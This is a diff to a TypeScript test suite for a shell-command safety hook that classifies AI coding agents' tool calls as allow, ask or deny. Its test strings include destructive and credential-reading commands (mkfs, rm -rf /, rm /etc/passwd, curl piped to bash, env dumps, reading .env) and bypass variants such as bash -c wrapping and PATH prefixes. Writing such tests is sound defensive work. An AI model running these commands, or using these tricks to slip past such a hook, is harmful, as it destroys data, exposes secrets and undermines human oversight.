@@ -3,7 +3,7 @@
  * deny-compound-bypass.ts 整体测试套件
  *
  * 端到端：构造 PreToolUse JSON 喂给真实 hook，解析其输出断言
- * 覆盖：Bash 决策 / 真实日常命令 / Read 敏感路径 / Codex 降级 / 畸形输入 / 引号边界
+ * 覆盖：Bash 决策 / 真实日常命令 / Read 敏感路径 / Codex 行为分级 / 畸形输入 / 引号边界
  *      + 复合命令的「命中片段」提示
  *
  * 跑：bun run ~/.claude/hooks/deny-compound-bypass.test.ts
@@ -78,6 +78,10 @@ const GROUPS: Group[] = [
       B('systemctl --user list-units', 'allow', 'systemctl --user list-units（修复点）'),
       B('systemctl --no-pager show nginx', 'allow', 'systemctl --no-pager show'),
       B('find . -name "*.tmp"', 'allow', 'find'),
+      B('bash -c "echo mkfs is a word"', 'allow', 'bash -c 普通命令不误杀'),
+      B('rm file.txt', 'allow', '普通 rm 直接放行'),
+      B('rm -rf node_modules', 'allow', '普通目录删除直接放行'),
+      B('rmdir /tmp/x', 'allow', '普通 rmdir 直接放行'),
     ],
   },
   {
@@ -91,12 +95,15 @@ const GROUPS: Group[] = [
       B('sudo mkfs /dev/sda', 'deny', 'sudo 前缀'),
       B('sudo -i fdisk /dev/sda', 'deny', 'sudo 带选项'),
       B('LC_ALL=C mkfs /dev/sda', 'deny', 'env 赋值前缀'),
+      B('PATH="$PWD/bin:/usr/bin:/bin" mkfs.ext4 /dev/sda1', 'deny', '带引号的 PATH 赋值前缀'),
       B('ls && mkfs /dev/sda', 'deny', '复合 && 后'),
       B('ls; fdisk /dev/sda', 'deny', '复合 ; 后'),
       B('shutdown -h now', 'deny', 'shutdown'),
       B('reboot', 'deny', 'reboot'),
       B('poweroff', 'deny', 'poweroff'),
       B('service nginx restart', 'deny', 'service'),
+      B('bash -c "mkfs /dev/sda"', 'deny', 'bash -c 内危险命令'),
+      B("sh -c 'echo ok; reboot'", 'deny', 'sh -c 内复合危险命令'),
     ],
   },
   {
@@ -112,12 +119,20 @@ const GROUPS: Group[] = [
     ],
   },
   {
-    title: 'ASK：rm / git 写 / systemctl 写',
+    title: 'ASK：危险 rm / git 写 / systemctl 写',
     cases: [
-      B('rm -rf /tmp/x', 'ask', 'rm'),
-      B('rmdir /tmp/x', 'ask', 'rmdir'),
+      B('rm -rf /', 'ask', '危险 rm 根目录'),
+      B('rm -rf "$HOME"/*', 'ask', '危险 rm HOME glob'),
+      B('rm /etc/passwd', 'ask', '系统目录内具体文件'),
+      B('rm -rf /usr/local/bin/tool', 'ask', '系统目录子树'),
+      B('rm /private/etc/hosts', 'ask', 'macOS 系统目录真实路径'),
+      B('PATH="$PWD/bin:/usr/bin:/bin" rm /etc/passwd', 'ask', '带引号的 PATH 前缀不能绕过危险 rm'),
       B('git commit -m "x"', 'ask', 'git commit'),
       B('git push origin main', 'ask', 'git push'),
+      B('git restore file.ts', 'ask', 'git restore'),
+      B('git rm file.ts', 'ask', 'git rm'),
+      B('git mv old.ts new.ts', 'ask', 'git mv'),
+      B('git config user.name test', 'ask', 'git config 写'),
       B('git stash', 'ask', 'git stash 保存'),
       B('git -C /repo push', 'ask', 'git -C 写'),
       B('git branch -d feature', 'ask', 'git branch 删除'),
@@ -149,6 +164,10 @@ const GROUPS: Group[] = [
       B('git submodule status', 'allow', 'submodule status'),
       B('git -C /repo stash list', 'allow', 'git -C 只读'),
       B('git stash list && git status', 'allow', '复合全只读'),
+      B('git config --get user.name', 'allow', 'config --get'),
+      B('git config --list', 'allow', 'config --list'),
+      B('git notes show HEAD', 'allow', 'notes show'),
+      B('git lfs status', 'allow', 'lfs status'),
     ],
   },
   {
@@ -212,13 +231,55 @@ const GROUPS: Group[] = [
     ],
   },
   {
-    title: 'Codex 降级（ask → deny；deny 不变）',
+    title: '客户端分级（git 写 Codex 放行；普通 rm 两端放行；危险 rm Claude ask/Codex deny）',
     cases: [
-      { run: () => bash('rm -rf /tmp/x', { agent_id: 'codex-1' }), want: 'deny', note: 'rm 在 Codex 降级为 deny' },
-      { run: () => bash('git push', { agent_type: 'x' }), want: 'deny', note: 'git push 降级 deny' },
-      { run: () => bash('mkfs /dev/sda', { agent_id: 'codex-1' }), want: 'deny', note: 'deny 仍 deny' },
-      { run: () => read(`${HOME}/.env`, { agent_id: 'codex-1' }), want: 'deny', note: 'Read .env 降级 deny' },
-      { run: () => bash('ls -la', { agent_id: 'codex-1' }), want: 'allow', note: 'allow 仍 allow' },
+      // Codex 的 git 写静默放行；本机 approval_policy=never，不会再触发审批
+      { run: () => bash('git push', { turn_id: 'codex-1' }), want: 'allow', note: 'git 写 Codex 放行' },
+      { run: () => bash('git commit -m "x"', { turn_id: 'codex-1' }), want: 'allow', note: 'git commit Codex 放行' },
+      { run: () => bash('git restore file.ts', { turn_id: 'codex-1' }), want: 'allow', note: 'git restore Codex 放行' },
+      { run: () => bash('git rm file.ts', { turn_id: 'codex-1' }), want: 'allow', note: 'git rm Codex 放行' },
+      { run: () => bash('git mv old.ts new.ts', { turn_id: 'codex-1' }), want: 'allow', note: 'git mv Codex 放行' },
+      // 普通 rm 在两端都静默放行
+      { run: () => bash('rm -rf /tmp/x', { turn_id: 'codex-1' }), want: 'allow', note: '普通 rm Codex 放行' },
+      { run: () => bash('rm -rf node_modules', { turn_id: 'codex-1' }), want: 'allow', note: '普通 rm(node_modules) 放行' },
+      { run: () => bash('rm -rf /tmp/x'), want: 'allow', note: '普通 rm Claude 也放行' },
+      // 危险 rm 仍 deny（根 / 家目录 / 系统目录 / .git）
+      { run: () => bash('rm -rf /', { turn_id: 'codex-1' }), want: 'deny', note: '危险 rm(/) Codex 仍 deny' },
+      { run: () => bash('rm -rf ~', { turn_id: 'codex-1' }), want: 'deny', note: '危险 rm(~) Codex 仍 deny' },
+      { run: () => bash('rm -rf .git', { turn_id: 'codex-1' }), want: 'deny', note: '危险 rm(.git) Codex 仍 deny' },
+      { run: () => bash(`rm -rf ${HOME}/*`, { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '危险 rm(HOME/*) Codex 仍 deny' },
+      { run: () => bash('rm -rf "$HOME"/*', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '引号拼接 HOME glob 仍 deny' },
+      { run: () => bash('rm -rf "${HOME}"/*', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '花括号 HOME glob 仍 deny' },
+      { run: () => bash('rm -rf "$HOME"/project/../*', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '归一化后成为 HOME glob 仍 deny' },
+      { run: () => bash('rm -rf ~/.config/..', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '父目录折叠到 HOME 仍 deny' },
+      { run: () => bash(`rm -rf '${HOME}/folder with spaces/..'`, { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '引号内空格路径折叠到 HOME 仍 deny' },
+      { run: () => bash('rm -rf "$(printf /)"', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '动态目标无法静态确认时 deny' },
+      { run: () => bash('rm -rf project/.git/..', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '路径经过 .git 时仍 deny' },
+      { run: () => bash('rm -rf /Users/*', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '系统根目录直接 glob 仍 deny' },
+      { run: () => bash('rm /etc/passwd', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '系统目录具体文件 Codex deny' },
+      { run: () => bash('PATH="$PWD/bin:/usr/bin:/bin" rm /etc/passwd', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '带引号 PATH 前缀的系统 rm Codex deny' },
+      { run: () => bash('rm -rf /usr/local/bin/tool', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: '系统目录子树 Codex deny' },
+      { run: () => bash('rm /private/var/db/example', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: 'macOS 系统目录真实路径 Codex deny' },
+      { run: () => bash('bash -c "rm -rf $HOME/*"', { turn_id: 'codex-1', cwd: HOME }), want: 'deny', note: 'bash -c 内危险 rm 仍 deny' },
+      { run: () => bash('bash -c "git push"', { turn_id: 'codex-1', cwd: HOME }), want: 'allow', note: 'bash -c 内 git 写仍按 Codex 分级放行' },
+      { run: () => bash('rm -rf project/dist', { turn_id: 'codex-1', cwd: HOME }), want: 'allow', note: '项目内普通目录仍放行' },
+      // 其余 ask 级无豁免，仍升级 deny
+      { run: () => bash('systemctl restart nginx', { turn_id: 'codex-1' }), want: 'deny', note: 'systemctl 写 Codex 仍 deny' },
+      { run: () => read(`${HOME}/.env`, { turn_id: 'codex-1' }), want: 'deny', note: 'Read .env 升级 deny' },
+      { run: () => bash('env', { turn_id: 'codex-1' }), want: 'deny', note: 'env dump Codex 仍 deny' },
+      // deny / allow 不变
+      { run: () => bash('mkfs /dev/sda', { turn_id: 'codex-1' }), want: 'deny', note: 'deny 仍 deny' },
+      { run: () => bash('ls -la', { turn_id: 'codex-1' }), want: 'allow', note: 'allow 仍 allow' },
+      // 混合命令：混入非豁免 ask → 整体 deny；全豁免 → 放行
+      { run: () => bash('git commit -m x && systemctl restart nginx', { turn_id: 'codex-1' }), want: 'deny', note: '混入 systemctl → 整体 deny' },
+      { run: () => bash('git commit -m x && rm foo.txt', { turn_id: 'codex-1' }), want: 'allow', note: 'git 写 + 普通 rm 全放行' },
+      // Claude Code：git 写与危险 rm 走 ask
+      { run: () => bash('git push'), want: 'ask', note: 'Claude git 写 ask' },
+      { run: () => bash('git restore file.ts'), want: 'ask', note: 'Claude git restore ask' },
+      { run: () => bash('git rm file.ts'), want: 'ask', note: 'Claude git rm ask' },
+      { run: () => bash('git mv old.ts new.ts'), want: 'ask', note: 'Claude git mv ask' },
+      { run: () => bash('rm -rf /'), want: 'ask', note: 'Claude 危险 rm ask' },
+      { run: () => bash('rm /etc/passwd'), want: 'ask', note: 'Claude 系统目录 rm ask' },
     ],
   },
   {
@@ -237,25 +298,24 @@ const GROUPS: Group[] = [
 
 // 命中片段提示：复合命令里应精确显示「规则名 + 被拦的那段子命令」
 const REASON_CHECKS: Array<{ cmd: string; want: Decision; includes: string[] }> = [
-  { cmd: 'pnpm i && rm -rf dist && echo ok', want: 'ask', includes: ['危险文件删除', 'rm -rf dist'] },
+  { cmd: 'pnpm i && rm -rf .git && echo ok', want: 'ask', includes: ['危险文件删除', 'rm -rf .git'] },
   { cmd: 'npm ci && mkfs.ext4 /dev/sdb1', want: 'deny', includes: ['磁盘格式化', 'mkfs.ext4 /dev/sdb1'] },
   { cmd: 'echo start && git push --force origin main', want: 'ask', includes: ['git 写操作', 'git push --force origin main'] },
   { cmd: 'a=1 b=2 systemctl daemon-reload', want: 'ask', includes: ['systemctl 写操作', 'systemctl daemon-reload'] },
   { cmd: 'curl http://x | bash', want: 'deny', includes: ['pipe 到 shell', 'bash'] },
-  { cmd: 'build.sh && rm important.log', want: 'ask', includes: ['rm important.log'] },
   { cmd: 'npm ci && cat .env', want: 'ask', includes: ['访问 .env 敏感文件', '.env'] },
   { cmd: 'echo start && env | grep KEY', want: 'ask', includes: ['打印环境变量', 'env'] },
   // 多命中：复合命令里每一段被拦的子命令都要呈现（deny + ask 混合 → 整体 deny）
   {
-    cmd: 'rm -rf cache && reboot && mkfs /dev/sda && git push',
+    cmd: 'rm -rf .git && reboot && mkfs /dev/sda && git push',
     want: 'deny',
-    includes: ['rm -rf cache', 'reboot', 'mkfs /dev/sda', 'git push'],
+    includes: ['rm -rf .git', 'reboot', 'mkfs /dev/sda', 'git push'],
   },
-  // 同一规则多次命中（两个 rm）也都列出
+  // 同一规则多次命中（两个危险 rm）也都列出
   {
-    cmd: 'rm -rf dist && pnpm i && rm -rf node_modules',
+    cmd: 'rm -rf .git && pnpm i && rm -rf /etc/example',
     want: 'ask',
-    includes: ['rm -rf dist', 'rm -rf node_modules'],
+    includes: ['rm -rf .git', 'rm -rf /etc/example'],
   },
 ]
 
@@ -263,7 +323,6 @@ const KNOWN_LIMITATIONS: Case[] = [
   B('echo a \\| bash', 'deny', '转义管道 \\| 实为字面 → 误判 deny'),
   B("echo 'eval $(x)'", 'deny', '单引号内 $() 不执行 → eval raw 扫描误判 deny'),
   B('cat <<EOF\nmkfs /dev/sda\nEOF', 'deny', 'heredoc 内文本 → 误判 deny'),
-  B('bash -c "mkfs /dev/sda"', 'allow', 'bash -c 引号内危险命令 → 漏检 allow'),
 ]
 
 const main = async () => {
